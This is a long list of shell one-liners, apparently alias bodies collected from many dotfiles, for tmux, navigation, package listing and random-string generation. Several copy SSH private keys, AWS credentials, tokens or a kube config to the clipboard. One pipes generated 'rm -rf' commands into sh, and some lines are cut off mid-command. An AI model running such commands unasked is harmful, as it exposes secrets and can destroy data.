command tree -dCAFa -I 'rhel.*.*.package|.git|.gem' --dirsfirst
command shift 9 2>/dev/null || set --
command shift 8 2>/dev/null || set --
command shift 7 2>/dev/null || set --
command shift 6 2>/dev/null || set --
command shift 5 2>/dev/null || set --
command shift 4 2>/dev/null || set --
command shift 3 2>/dev/null || set --
command shift 2 2>/dev/null || set --
command screen -r || command screen -AU
command ls -A --classify | grep '/' | column
command grep -i 'pretty' /etc/os-release | command cut -d= -f2 | command xargs
command cat $(php --ini | grep xdebug).back > $(php --ini | grep xdebug)
command .. 2>/dev/null || cd $(dirname $PWD)
command -v script/istart && script/istart || script/start
command -v route && open http://$(route -n get default | grep gateway | awk -F ': ' '{ print $2 }')
command -v mosh 2>&1 1>/dev/null && mosh rosencrantz || ssh rosencrantz
command -v mosh 2>&1 1>/dev/null && mosh guildenstern || ssh guildenstern
command -v ack-grep > /dev/null 2>&1 && ack-grep || ack
comm -3 <(declare | sort) <(declare -f | sort)
comm -23 <(yaourt -Qeq|sort) <(yaourt -Qgq base base-devel|sort)
comm -23 <(trizen -Qqt|sort) <(pacman -Qqg base base-devel|sort)
comm -23 <(sudo find / \( -path '/dev' -o -path '/sys' -o -path '/run' -o -path '/tmp' -o -path '/mnt' -o -path '/srv' -o -path '/proc' -o -path '/boot' -o -path '/home' -o -path '/root' -o -path '/var/lib/pacman' -o -path '/var/cache/pacman' -o -path '/var/cache/man' -o -path '/var/db/sudo/$USER' -o -path '/lost+found' \) -prune -o -type f -print | sort -u) <(pacman -Qlq | sort -u)
comm -23 <(sudo find / \( -path '/dev' -o -path '/sys' -o -path '/run' -o -path '/tmp' -o -path '/mnt' -o -path '/srv' -o -path '/proc' -o -path '/boot' -o -path '/home' -o -path '/root' -o -path '/media' -o -path '/var/lib/pacman' -o -path '/var/cache/pacman' \) -prune -o -type f -print | sort -u) <(pacman -Qlq | sort -u)
comm -23 <(sudo find / \( -path '/dev' -o -path '/sys' -o -path '/run' -o -path '/tmp' -o -path '/mnt' -o -path '/srv' -o -path '/proc' -o -path '/boot' -o -path '/home' -o -path '/root' -o -path '/media' -o -path '/var/lib/pacman' -o -path '/var/cache/pacman' \) -prune -o -type f -print | sort -u ) <(pacman -Qlq | sort -u)
comm -23 <(pm -Qqen | sort) <(pm -Qqg base base-devel | sort -u)
comm -23 <(pacman -Qqt | sort) <(pacman -Sqg base base-devel | sort)
comm -23 <(pacman -Qqet | sort) <(pacman -Qqg base base-devel xorg | sort)
comm -23 <(pacman -Qqen | sort) <(pacman -Qqg base base-devel | sort)
comm -23 <(pacman -Qqe | sort) <(pacman -Qqg base base-devel | sort)
comm -23 <(pacman -Qqe | sort -u) <(pacman -Qqg base -g base-devel | sort -u)
comm -23 <(pacman -Qetq|sort) <(pacman -Qgq base base-devel|sort)
comm -23 <(pacman -Qeq|sort) <(pacman -Qmq|sort) > ~/yunio/software/software/pkglist
comm -23 <(pacman -Qeq|sort) <(pacman -Qmq|sort) > ~/documents/_backups/list/pkglist-$(date +%Y%d%m).txt
comm -23 <(pacman -Qeq|sort) <(pacman -Qmq|sort) > ~/backup/pkglist; pacman -Qmq > ~/backup/pkglist_aur
comm -23 <(pacman -Qeq|sort) <(pacman -Qmq|sort) > pkglist.txt
comm -23 <(pacman -Qeq|sort) <(pacman -Qmq|sort) > pkglist
comm -23 <(pacman -Qeq|sort) <(pacman -Qmq|sort)
comm -23 <(pacman -Qeq|sort) <(pacman -Qgq base base-devel|sort)
comm -23 <(pacman -Qeqn | sort) <(pacman -Qgq base base-devel | sort)
comm -23 <(pacman -Qeq | sort) <(pacman -Sqg base base-devel xorg | sort)
comm -23 <(pacman -Qeq | sort) <(pacman -Qgq base-devel xorg-apps texlive-most | sort)
comm -23 <(pacman -Qeq | sort) <(pacman -Qgq base base-devel | sort)
comm -23 <(pacman -Qeq | sort) <(pacman -Qgq base base-devel xorg | sort)
comm -23 <(pacman -Qdq) <(pacman -Qeq | xargs -l pactree -lu | sort)
comm -23 <(apt-mark showmanual | sort -u) <(gzip -dc /var/log/installer/initial-status.gz | sed -n
comm -13 <(pactree host-$(hostname)-cfg -u | sort) <(pacman -Qsq | sort)
comm -13 <(pacman -Qqdt | sort) <(pacman -Qqdtt | sort)
comm -13 <(pacman -Qmq | sort) <(pacman -Qqe | sort) > pkglist
comm -13 <(pacman -Qeqn | sort) <(pacman -Qeq | sort)
comm -13 <(dls $(p .*(.))|sort) <(p .*(.)|sort)
comm -12 <(git diff --name-only | sort) <(cd $HOME && find zim/**/*.txt -mtime -7 | sort);
comm -12 <(git diff --name-only | sort) <(cd $HOME && find zim/**/*.txt -mmin -7 | sort);
comm -12 <(git diff --name-only | sort) <(cd $HOME && find zim/**/*.txt -ctime -7 | sort);
comm -12 <(git diff --name-only | sort) <(cd $HOME && find zim/**/*.txt -cmin -7 | sort);
comm -12 <(git branch -a --no-merge master | sort) <(git branch -a --no-merge develop | sort)
comm -12 <(brew outdated | sort) <(brew leaves | sort)
colourify ps aux | grep -v grep | grep -i -e VSZ -e
colosse-info | head -n 8 | tail -n 4
colorize | sed -e $'s/$/ \e[K/' -e $'\\\$s/$/\e[J/' | command less -iEFKLQsrS
colorex --bred '.*(fail|error|invalid).*'
code /home/nuthanc/ansible_for_auto/inventory/hosts || vi /home/nuthanc/ansible_for_auto/inventory/hosts
code . || code-insiders .
code --list-extensions | grep -E 'rust' | sort -f > ~/dotfiles/vscode/rust-extensions.txt
code --list-extensions | grep -E 'react-native' | sort -f > ~/dotfiles/vscode/react-native.txt
code --list-extensions | grep -E 'nativescript' | sort -f > ~/dotfiles/vscode/nativescript-extensions.txt
co master; git pull; git remote prune origin; git branch --merged | grep -v -e '^\\*' -e 'master' | xargs git branch -d
cmp -s ~/stprobe.env ~/stprobe.env.uc2 && cp -v ~/stprobe.env.uc1 ~/stprobe.env || cp -v ~/stprobe.env.uc2 ~/stprobe.env
cmd= $(history|cut -c 8-|zenity --list --column History)
cmd= $(history 30 |cut -c 8-| zenity --list --column History & )
cls;cat ~/.oh-my-zsh/plugins/systemadmin/systemadmin.plugin.zsh | grep '\#\|.'
cls && make || make comp
cln;sudo bleachbit --clean system.rotated_logs system.cache system.localizations system.trash ; sudo paccache -vrk 2 || return 0
clippaste | sort -n | clipcopy && pline
clippaste | jq | clipcopy
clippaste | comma | clipcopy && pline
clippaste | base64 | clipcopy
clippaste | base64 -d | clipcopy
clip | jq . | e -
clear_console || clear;set +o nounset
clear;git ls-files -m | xargs ls -1 2>/dev/null | grep
clear;git diff-tree -r --no-commit-id --name-only master@\{u\} head | xargs ls -1 2>/dev/null | grep
clear;echo;ls -1F $HOME/bin/x*|cut -d / -f5|nl;echo;cd $HOME/bin
clear;echo;ls -1F $HOME/bin/9*|cut -d / -f5|nl;echo;cd $HOME/bin
clear;echo;ls -1F $HOME/bin/8*|cut -d / -f5|nl;echo;cd $HOME/bin
clear;echo;ls -1F $HOME/bin/7*|cut -d / -f5|nl;echo;cd $HOME/bin
clear;echo;ls -1F $HOME/bin/6*|cut -d / -f5|nl;echo;cd $HOME/bin
clear;echo;ls -1F $HOME/bin/5*|cut -d / -f5|nl;echo;cd $HOME/bin
clear;echo;ls -1F $HOME/bin/4*|cut -d / -f5|nl;echo;cd $HOME/bin
clear;echo;ls -1F $HOME/bin/3*|cut -d / -f5|nl;echo;cd $HOME/bin
clear;echo;ls -1F $HOME/bin/2*|cut -d / -f5|nl;echo;cd $HOME/bin
clear;echo;ls -1F $HOME/bin/1*|cut -d / -f5|nl;echo;cd $HOME/bin
clear; while x=1; do /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | grep CtlRSSI | sed -e
clear; while true; do (( $RANDOM % 2 )) && echo -n ╱ || echo -n ╲; sleep 0.07; done
clear; ps -ef | grep -v grep | grep -i
clear; git st 2>/dev/null || (pwd && ls -a)
clear; git diff --color | diff-so-fancy | less
clear; echo; echo; seq 1 $(tput cols) | sort -R | spark; echo; echo
clear || alias clear=cl \n
clear || alias clear=cl
clear ; tmux attach -t Temp $* &>/dev/null || tmux new -s Temp $*
clear ; tmux attach -t Music &>/dev/null || tmux new -s Music -c ~
clear ; tmux attach -t All $@ &>/dev/null || tmux new -s All $@
clear ; git config --list | grep remote.origin.url ; git log | head
clear && top -b|cowsay -n | lolcat
clear && tmux attach -t 5 &>/dev/null || tmux switch-client -t 5 &>/dev/null
clear && tmux attach -t 4 &>/dev/null || tmux switch-client -t 4 &>/dev/null
clear && tmux attach -t 3 &>/dev/null || tmux switch-client -t 3 &>/dev/null
clear && tmux attach -t 2 &>/dev/null || tmux switch-client -t 2 &>/dev/null
clear && tmux attach -t 1 &>/dev/null || tmux switch-client -t 1 &>/dev/null
clear && tmux attach -t 0 &>/dev/null || tmux switch-client -t 0 &>/dev/null
clear && tail -f swap.tmp 2>&1 | perl -ne 'if (/file truncated|plik obcięty/) {system 'clear'} else {print}'
clear && ps aux | head -n1 && ps aux | grep vim
clear && ls -al | more | column
clear && git ls-files | xargs grep -c console.log | grep ':[1-9]$'
clear && fortune | cowsay | lolcat
clear && fortune -a | cowthink | lolcat
clear && fortune -a | cowsay | lolcat
clear && du --summarize --human-readable ./err.txt ./generated.file ./succ.txt | sort --human-numeric-sort --stable --reverse | bat ---color always
clear && dirs +0 | \\tr -d '\n' | xclip -selection clipboard
clamscan -i --max-filesize=50M --exclude-dir='^/sys|^/proc|^/dev'
clamscan --max-filesize=50M --exclude-dir='^/sys|^/proc|^/dev'
chromium https://github.$(git config remote.origin.url | cut -f2 -d. | tr
chromium --no-proxy-server --temp-profile --user-data-dir=/tmp/rz-dev_chrome_$(date | md5sum | cut -b -8) http://rhizi.local:8080/index
chromeopentabs | fzf | xargs chromesettab
chrome 'http://www.rainymood.com' | chrome 'http://www.infinitelooper.com/?v=HMnrl0tmd3k&p=n' | chrome 'http://www.infinitelooper.com/?v=fsD1zoI7NYo'
cgitroot ; git status --porcelain=v1 | grep '^R[ MD] ' | sed -r 's/^...//;s/(.*) -> (.*)/git mv -v \
cdr $(cdr -l | fzf --height 60% --nth 2.. | awk
cdn2 'valgrind --tool=callgrind debitadmin; kcachegrind $(ls -rt callgrind.out.*| tail -n 1); rm $(ls -rt callgrind.out.* | tail -n 1)'
cdg || cd ~/projects/wust2; ./start
cdda2wav -D=/dev/hdc - | lame - - | nc -l -p 3000
cdc; rm -f website/static/CACHE/*/*; find . | grep '\.pyc\$' | xargs rm
cd; clear; fortune | cowsay | lolcat
cd; clear; fortune | cowsay -f dragon | lolcat -s 1
cd ~; tmux attach || tmux new-session
cd ~/testnet;ls | grep -v genesis.json | xargs -i rm -rf {}
cd ~/scripts; tmux attach -d -t script || tmux new -s script
cd ~/salt-developer && ./scripts/enable-bridge \$(route get google.com | grep interface | sed s/interface:\ //)
cd ~/repos/maint/; nice ./update all 2>&1 | tee last_update.log | ccze
cd ~/manageiq/vmdb || cd ~/manageiq
cd ~/code; openssl x509 -in certificate.crt -pubkey -noout -outform pem | sha256sum; openssl pkey -in privateKey.key -pubout -outform pem | sha256sum;
cd ~/code/m_m; tmux attach -d -t wcode || tmux new -s wcode
cd ~/code/lib; tmux attach -d -t code || tmux new -s code
cd ~/code/lendinghome-monolith/ops && yarn build:watch || osascript -e 'display notification \
cd ~/code/emacs/src && sudo gdb emacs $(ps aux | grep -i 'emac[s]' | awk '{print $2}')
cd ~/catkin_rdv && catkin_make run_tests_rdv_track_finder_rostest_test_racetrack_test.test || cd -
cd ~/catkin_rdv && catkin_make -j1 || cd -
cd ~/catkin_rdv && catkin_make -DCMAKE_BUILD_TYPE=Release || cd -
cd ~/andrews-configs || exit && git pull origin master && ~/andrews-configs/dotfiles/makesymlinks.sh
cd ~/Schreibtisch/ 2>/dev/null || cd ~/Desktop/
cd ~/Projects/wiki.wiki; git pull; r=$(ls Release-3.5* | sort -V | tail -1); echo $r; vim $r
cd ~/Projects/luxurysociety/branches;cd \`ls -ld milestone-* |tail -n1|egrep -o 'milestone-.*'\`
cd ~/Projects/dooku; ./quote | xmllint --xpath 'string(//aggregatorResponse/quote/link)' - | xargs open -a \
cd ~/Projects || ls -a
cd ~/Pictures/Wal && wal -i $(ls | sort -R | tail -1)
cd ~/Pictures && wal -i $(ls | sort -R | tail -1)
cd ~/Heidi_portable || wine start heidisql.exe
cd ~/Git/dotfiles || cd ~/git/dotfiles
cd ~/Downloads || ls
cd ~/Downloads && ls *.ica -tr | tail -n 1 | xargs /opt/Citrix/ICAClient/wfica
cd ~/Documents/git-commit-dir && git commit &> /dev/null || true && cd -
cd ~/Documents/Notes && date +%c | cat >> `date +%F` ; cat >> `date +%F` ; echo | tac >> `date +%F` && cd
cd ~/Code/wearefair ; cd $(ls ~/Code/wearefair -d | pick | cut -c 6-)
cd ~/Code/ ; cd $(ls ~/Code/ | pick | cut -c 6-)
cd ~/; tmux attach -d -t rtor || tmux new -s rtor
cd ~/.ssh/ || ll && . ~/.ssh/config
cd ~ && fd --ignore-file .searchignore | fzf --print0 | xargs -0 open -R
cd ~ && fd --ignore-file .searchignore | fzf --print0 | xargs -0 open
cd ~ && fd --ignore-file .searchignore | fzf --print0 | xargs -0 $EDITOR
cd ~ && fd --ignore-file .searchignore -t d | fzf --print0 | xargs -0 open
cd u >&~/X && l || nogo
cd html 2>/dev/null || cd ../html 2>/dev/null
cd build/ && rm -rf err.txt generated.file succ.txt && cmake .. && make && ./unit-tests && make valgrind && cd .. || cd ..
cd build && make && cd .. || cd ..
cd android/ && ./gradlew --info clean && cd .. || cd ..
cd android && ./gradlew assembleRelease && cd .. || cd ..
cd `mount | grep cryptusb | awk '{print $3}'`
cd `j | fzf | awk
cd `git rev-parse --show-toplevel || pwd`
cd `find -mindepth 1 -maxdepth 1 -type d | xargs ls -td | head -n 1`
cd `echo ${PWD} | cut -f1-6 -d/`/team0/`echo $PWD | cut -f8- -d/`
cd `echo ${PWD} | cut -f1-6 -d/`/${ROUTING}/`echo $PWD | cut -f8- -d/`
cd `chiery list | fzf | xargs chiery get`
cd \`z | fzf | awk '{print \$2}'\`
cd \$(z | awk '{print \$2}' | fzf)
cd \$(git rev-parse --show-toplevel || print \
cd \$(git rev-parse --show-toplevel || echo '.')
cd \$(git rev-parse --show-toplevel 2>/dev/null || echo '.')
cd \$(git rev-parse --show-toplevel 2> /dev/null) || .
cd ; umount /dev/zip || umount /dev/zip
cd /vms 2>/dev/null ||cd /*/vms 2>/dev/null
cd /usr/local/etc/php || ll
cd /proc/\`pgrep plugin-cont\`/fd ; mplayer \`ls -l |grep FlashXX|awk '{print \$9}'\`; cd -
cd /kafka 2>/dev/null ||cd `pwd` 2>/dev/null
cd /home/$USER/submitted/output/ && ls -t | head -1 | xargs cat && cd -
cd /home/$USER/submitted/logs/ && ls -t | head -1 | xargs cat && cd -
cd /home/$USER/submitted/errs/ && ls -t | head -1 | xargs cat && cd -
cd /d/repos/ > /dev/null 2>&1 || cd /mnt/c/repos/
cd /app 2>/dev/null ||cd `pwd` 2>/dev/null
cd /Users/nobelw/Projects/UNIS/gitrepo/dispatcher-config && sudo make clean all install ENV=localdev DESTDIR=/Users/nobelw/Projects/UNIS/gitrepo/aem-dev-env/dispatcher/config && docker exec -it dispatcher /bin/sh -c '[ -e /bin/bash ] && /bin/bash || /bin/sh & httpd -k restart'
cd /Users/Darek/web/sites/dziekanat && phpunit /Users/Darek/web/sites/dziekanat/tests/Browser/DziekanatMarkCheck.php --filter testExample || open /Users/Darek/web/sites/dziekanat/tests/Browser/screenshots
cd ./$(ls -F ./ | grep / | percol --match-method pinyin)
cd ./$(git rev-parse --show-cdup) || cd ~
cd ..; rmdir $OLDPWD || cd $OLDPWD
cd ../html 2> /dev/null || cd html 2> /dev/null
cd && coinmon -c usd && weather && upgrade_oh_my_zsh && bubu && nvm ls-remote | grep 'Latest LTS\|v11.' && nvm use default && npmOg
cd && coinmon -c usd && weather && upgrade_oh_my_zsh && bubu && brew cask cleanup && brew cask outdated && nvm ls-remote | grep 'Latest LTS\|v10.' && nvm use default && npmOg
cd ${yoctoBuildDirFull}; find $logPath -type l | xargs grep '^ERROR:\|^WARNING:'
cd $U3D_SERVER_DIR_BIN && ./runctl live || cd -
cd $U3D_ROBOT_DIR_BIN && sh run.sh live || cd -
cd $SYSTEM_CVS_BASE; export CUR_PROJECT_DIR=$SYSTEM_PROJECT_BASE/`cat ~/.current_project`; cat $CUR_PROJECT_DIR/affected_files.txt | ql | xargs -n1 cvs log -h
cd $PWD 2>/dev/null || cd $(pwd) 2>/dev/null && pwd
cd $HOME/桌面 2> /dev/null || cd $HOME/Desktop
cd $HOME/work 2> /dev/null || cd $HOME/workspace 2> /dev/null
cd $(z -l | cut -c12- | peco)
cd $(z -l | cut -c 12- | fzf)
cd $(readlink $PWD || echo $PWD)
cd $(pwd | sed s@/oreo/@/nougat/@ | sed s@/pie/@/nougat/@)
cd $(pwd | sed s@/nougat/@/pie/@ | sed s@/oreo/@/pie/@)
cd $(pwd | sed s@/nougat/@/oreo/@ | sed s@/pie/@/oreo/@)
cd $(ls ~/Develop/projects | peco | xargs -I % echo ~/Develop/projects/%)
cd $(ls -lt | grep ^d | awk
cd $(ls -d */ | sort -R | head -1) && echo
cd $(ls -F -A | grep /|peco)
cd $(gls -d ~/dev/src/*/*/*/.git | xargs -n 1 dirname | peco)
cd $(git_root || print .)
cd $(git-root || print .)
cd $(git-root || echo $HOME)
cd $(git workdir || echo .)
cd $(git rev-parse --show-toplevel || pwd)
cd $(git rev-parse --show-toplevel || echo .)
cd $(git rev-parse --show-toplevel || echo $HOME)
cd $(git rev-parse --show-toplevel || echo
cd $(git rev-parse --show-toplevel 2> /dev/null || print .)
cd $(ghq list -p | sort | peco)
cd $(ghq list --p|fzf) && basename `pwd` | xargs tmux rename-window
cd $(gem environment | grep -e '- INSTALLATION DIRECTORY:' | sed 's/^.*: //g')
cd $(find . -type f | peco | xargs dirname )
cd $(fasd | fzf | awk {
cd $(fasd | fzf -e -i --tac --no-sort | awk
cd $(dirs -lp | uniq | $HOME/.fzf/bin/fzf --height=15)
cd $(dirs -l -v| pick | cut -c 3-)
cd $(/bin/ls -BF1t | grep / | head -1)
cd $( git rev-parse --show-toplevel || echo . ); pwd
cd $( ghq list | peco | xargs -I{} echo `ghq root`/{} )
cd $( ghq list --full-path | peco | xargs -I % echo /%)
cd $( dirname $( git rev-parse --git-dir 2>/dev/null ) 2>/dev/null ) || ~
cat ~/temp/git_log.txt | peco | pbcopy
cat ~/radio | pick | xargs mpv
cat ~/logs/$LOG_NAME2 | pretty|less -R
cat ~/logs/$LOG_NAME | pretty|less -R
cat ~/logs/$ALOG_NAME2 | pretty|less -R
cat ~/logs/$ALOG_NAME | pretty|less -R
cat ~/links | pick | xargs palemoon
cat ~/lib/bash_lib/profile | grep alias | grep -v aliases
cat ~/grep_res.txt | removeColor | vim -
cat ~/github/ssh/id_github.pub | pbcopy | echo '=> Public key copied to pasteboard.'
cat ~/folders | pick | xargs spacefm
cat ~/dotfiles/.lib/functions.bash | grep function | awk '{print OB\$2}'
cat ~/dev/nu/mastercard.gpg | gpg -d | pbcopy
cat ~/configs | pick | xargs gvim
cat ~/bin/spotifyplaylists-applescript.txt | fzf | osascript
cat ~/Mail/* /var/mail/chigby |grep -iv -f ~/badheaders.txt |egrep -oi
cat ~/Documents/fa_cheat.txt | grep -v Name | grep -i -B1 -e
cat ~/Development/skynet/sky/sampleData/events.log| grep OrderCreate | groovy ~/Development/skynet/sky/log-replayer/replay.groovy
cat ~/Box\ Sync/memo/git.bash | peco | pbcopy
cat ~/.zshrc|grep alias|grep -i
cat ~/.zshrc |grep alias && cat ${SHAREDPATH}/.zshrc |grep alias
cat ~/.zshrc | grep alias | sort
cat ~/.zshrc | grep -v '#' | grep alias
cat ~/.zsh_history | cut -d\; -f2 | fzf --ansi --tac --no-sort
cat ~/.zsh/config_files/aliases.zsh |g git |g -v galias
cat ~/.things.cpt | ccrypt -d | grep
cat ~/.ssh/id_rsa_personal.pub | pbcopy | echo '=> Public key copied to pasteboard.'
cat ~/.ssh/id_rsa.pub | xclip | printf '=> Public key copied to pasteboard.\n'
cat ~/.ssh/id_rsa.pub | xclip -selection clipboard | echo \
cat ~/.ssh/id_rsa.pub | xclip -selection clipboard | echo '=> Public key copied to pasteboard.'
cat ~/.ssh/id_rsa.pub | tr -d '\n' | pbcopy
cat ~/.ssh/id_rsa.pub | tee /dev/stderr | xs
cat ~/.ssh/id_rsa.pub | pbcopy | printf 'Public key copied to clipboard.\n'
cat ~/.ssh/id_rsa.pub | pbcopy | printf '=> Public key copied to pasteboard.\n'
cat ~/.ssh/id_rsa.pub | pbcopy | printf '=> Public key copied to asd\n'
cat ~/.ssh/id_rsa.pub | pbcopy | echo_yellow '=> Public key copied to clipboard.'
cat ~/.ssh/id_rsa.pub | pbcopy | echo \
cat ~/.ssh/id_rsa.pub | pbcopy | echo 'Public key has been copied to clipboard.'
cat ~/.ssh/id_rsa.pub | pbcopy | echo 'Public key copied to pasteboard.'
cat ~/.ssh/id_rsa.pub | pbcopy | echo 'Public key copied to clipboard.'
cat ~/.ssh/id_rsa.pub | pbcopy | echo '>>> Public key copied to clipboard'
cat ~/.ssh/id_rsa.pub | pbcopy | echo '=> Public key copied to pasteboard.'
cat ~/.ssh/id_rsa.pub | pbcopy | echo '=> Public key copied to clipboard.'
cat ~/.ssh/id_rsa.pub | pbcopy | echo '-> Public key copied to pasteboard.'
cat ~/.ssh/id_rsa.pub | copy | echo 'SSH public key copied to pasteboard'
cat ~/.ssh/id_rsa | pbcopy | echo_yellow '=> Private key copied to clipboard.'
cat ~/.ssh/id_ed25519.pub | pbcopy | echo '=> Public key copied to pasteboard.'
cat ~/.ssh/config ~/.ssh/config.d/* | grep -e '^Host' | sed -e 's/^Host //g'
cat ~/.ssh/config |grep ^Host\ |sed -e 's/^Host\ //g'
cat ~/.ssh/config | grep ^Host | cut -c6-
cat ~/.ssh/config | grep -e '^Host' | cut -d ' ' -f 2
cat ~/.ssh/config | grep -E '^host|^####'
cat ~/.ssh/conf.d/config ~/.ssh/conf.d/*.conf > ~/.ssh/config;cat ~/.ssh/config | grep Host | grep -v HostName
cat ~/.oh-my-zsh/plugins/git/git.plugin.zsh | grep alias | less
cat ~/.oh-my-zsh/custom/custom.zsh | grep alias | sed 's/alias/'→'/g'
cat ~/.nexus/tokens | head -n 1 | cut -f 2 -d '='
cat ~/.logs/* | grep '^20' | sort
cat ~/.local/scripts/glogin-params | fzf | xargs glogin
cat ~/.kube/config | base64 | pbcopy
cat ~/.bashrc | grep function | cut -c 9-
cat ~/.bashrc | grep alias | sort
cat ~/.bashrc | grep -i '^alias' | sort
cat ~/.bash_private ~/.bash_profile | grep '^alias\|^function'
cat ~/.bash_history | frequency | head -n 20
cat ~/.bash_functions | tail -n+185 | more
cat ~/.bash/aliases | grep --color=never alias | sed -e 's/^[ \t]*//'
cat ~/.aws/credentials | grep '\[' | tr -d '[]'
cat | textutil -convert txt -stdin -stdout -format html | more
cat | sed '1i#include <stdio.h>\\n#include <malloc.h>\\n#include <string.h>\\nint main() { ' | sed '$ a printf(\
cat | dmenu -i -p 'vo' -l 25 | awk -F: '{print \
cat yarn.lock | grep '^[^ ]' | wc -l
cat testlog.txt | grep 'should create FAILED' | tee -a testlog.txt
cat patterns.txt |grep -E '(//|^$)' > patterns_todo.txt ; nano patterns_todo.txt
cat package.json | underscore select '.dependencies:only-child' --outfmt text | underscore print --color && du -hs ./node_modules
cat package.json | jq -S '.scripts' | fzf
cat domibus/domibus-parametric-pmode.xml | sed s/\$\{name\}/red_gw/g | sed s/\$\{connectorPartyId\}/tc.elonia.toop/g > domibus/domibus-red-pmode.xml"
cat `pwd`/src/tests/*.py|grep 'global_params.post'|awk -F \
cat \!*|gunzip|tar vxf -
cat \!*|gunzip|tar vtf -
cat Vagrantfile | grep 'vm.' | grep -v '^#' --color=always
cat Gemfile | grep '^ruby' | sed -E \
cat <<EOF | gosh bitcode.scm | nkf -w
cat /var/log/pacman.log | grep upgraded | grep -i
cat /var/log/nginx/access.log.1 | /opt/kataribe -conf /opt/kataribe.toml | less
cat /var/log/cron-pacman.log | uniq && cat $guy/.irssi/log/*/* | grep -vi h3r4ut
cat /var/log/apache2/access.log| grep -v 127.0.0.1 |grep -v 192.168.
cat /usr/share/dict/words|grep -v '[^A-Za-z]s'|tpope page egrep -i
cat /usr/share/dict/words | rl | grep -vP \
cat /tmp/seaside | jq -r .pks_api.uaa_admin_password | pbcopy
cat /tmp/scale_cfg.json | python -m json.tool | tee /tmp/scale_cfg.json
cat /tmp/forecast | head -n 7 | tail -n 6
cat /tmp/emeryville | jq -r .pks_api.uaa_admin_password | pbcopy
cat /sys/kernel/debug/tracing/trace | head -10; cat /sys/kernel/debug/tracing/trace | tail -50
cat /proc/vmstat | egrep 'dirty|write'
cat /proc/partitions | grep '^\s*[0-9].*[0-9]\s*$' | awk '{ print \$4 }'
cat /proc/meminfo | grep MemTotal | awk '{ print \$2 }'
cat /proc/meminfo | grep MemFree | awk '{ print \$2 }'
cat /proc/meminfo | grep MemAvailable | awk '{ print \$2 }'
cat /proc/cpuinfo | grep processor | wc -l
cat /proc/cpuinfo | grep proc | wc -l
cat /proc/cpuinfo | grep -i processor | wc -l
cat /proc/cpuinfo | awk '/^processor/{print \$3}' | wc -l
cat /home/pi/.config/wisebot/config.json | jq . | grep '\
cat /home/den/adirs | fzf | sh
cat /home/den/Video/video | fzf | sh
cat /home/bagool/todo.txt | wc -l | lolcat
cat /home/art/Documents/inserter2 | uniq | grep -i
cat /etc/redis.conf | grep -v ^# | grep -v ^$
cat /etc/puppet/puppet.conf | grep environment | awk '{print $3}'
cat /etc/php.ini | grep -v ^[\;] | awk 'NF' > /etc/php.ini.dump
cat /etc/passwd | grep /home |cut -d: -f1
cat /etc/passwd | cut -d: -f1 | sort
cat /etc/nagios/resource.cfg|grep USER | grep -v ^#
cat /etc/modules | grep -v ^# | grep -v ^$
cat /etc/modprobe.d/raspi-blacklist.conf | grep -v ^# | grep -v ^$
cat /etc/group | cut -d: -f1 | sort
cat /etc/lsb-release /etc/os-release | grep ^ID= | cut -d= -f2
cat /etc/lsb-release /etc/os-release | sort | uniq
cat /dev/urandom|hexdump -C | ag 'ca fe'
cat /dev/urandom| hexdump -C |grep '7e 31'
cat /dev/urandom |tr -dc A-Za-z0-9 | head -c${1:-32};echo;
cat /dev/urandom |tr -dc A-Z9|head -c${1:-81}
cat /dev/urandom | tr -dc A-Za-z0-9 | head -c16 && echo
cat /dev/urandom | tr -dc A-Z9 | head -c${1:-81}
cat /dev/urandom | tr -dc A-Z-a-z-0-9 | head -c${1:-16} ; echo
cat /dev/urandom | tr -dc 0-9 | head -c4 ; echo
cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head --bytes
cat /dev/urandom | tr -dc '[:alnum:]' | head -c 10; echo ''
cat /dev/urandom | tr -cd 'a-f' | head -c 10
cat /dev/urandom | tr -cd '[:alnum:]' | head -c 32
cat /dev/urandom | hexdump | grep 'ca fe'
cat /dev/urandom | hexdump -c | ccze -A
cat /dev/urandom | hexdump -C | grep \
cat /dev/urandom | hexdump -C | grep --color=auto \
cat /dev/urandom | hexdump -C | grep --color=always 'ca fe'
cat /dev/urandom | hexdump -C | grep --color 'ca fe'
cat /dev/urandom | hexdump -C | grep 'ca fe'
cat /dev/urandom | hexdump -C | grep 'b3 3f'
cat /dev/urandom | hexdump -C | grep '42 42'
cat /dev/urandom | hexdump -C | grep
cat /dev/urandom | hexdump -C | ag --color 'ce e'
cat /dev/urandom | head -c 15 | base64
cat /dev/urandom | head -1 | tr -dc A-Za-z0-9; echo
cat /dev/urandom | env LC_CTYPE=C tr -dc a-zA-Z0-9 | head -c 32; echo
cat /dev/urandom | env LC_CTYPE=C tr -dc a-zA-Z0-9 | head -c 24; echo
cat /dev/urandom | env LC_CTYPE=C tr -dc a-zA-Z0-9 | head -c 16; echo
cat /dev/urandom | env LC_CTYPE=C tr -cd 'a-f0-9' | head -c 32
cat /dev/urandom | env LC_CTYPE=C tr -cd 'a-f0-9' | head -c
cat /dev/urandom | env LC_CTYPE=C tr -cd 'A-Za-z0-9' | head -c
cat /dev/urandom | base64 | tr -dc
cat /dev/urandom | base64 | head -c10
cat /dev/urandom | base64 | head -c
cat /dev/urandom | base64 | grep -i -m 1 --color
cat /dev/urandom | base32 | head -c
cat /dev/urandom | LC_CTYPE=C tr -dc '[:alnum:]' | head -c
cat /dev/urandom | LC_ALL=C tr -cd [:alnum:] | head -c 30; echo
cat /dev/random | hexdump | awk '{printf
cat /dev/random | hexdump -C | gen_pass
cat /dev/random | head -c18 | base64
cat /dev/random | LC_CTYPE=C tr -cd 123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz | head -c${1:-64}; echo
cat /dev/null | vipe | xclip -sel clip
cat /boot/config.txt | grep -v ^# | grep -v ^$
cat /boot/cmdline.txt | grep -v ^# | grep -v ^$
cat .ssh/id_rsa | pbcopy| echo 'sshkey copied.'
cat .gitignore | xargs echo rm -rf | sh
cat .git/config | grep url | sed 's/:/\//g; s/\.git//; s/git@/https:\/\//g; s/ *url *= *//g;'
cat .git/config | grep url | sed 's/*url *= *//g;'
cat .git/config | grep url | cut -d= -f2
cat .git/config | grep url | awk '{print \$3}'
cat .git/config | awk '/url/{print \$3}' | xargs open
cat .fslist | fzf --height=20 | tee /dev/tty
cat .config/i3/config | grep '^bindsym \$mod+' | sed 's/^bindsym \$mod+//'
cat .bash_aliases .bashrc .bash_functions | grep alias | grep
cat ./**/*.py | sed '/^\s*$/d' | wc -l
cat ./**/* | sed '/^\s*$/d' | wc -l
cat *notes* | grep CQ: | shuf
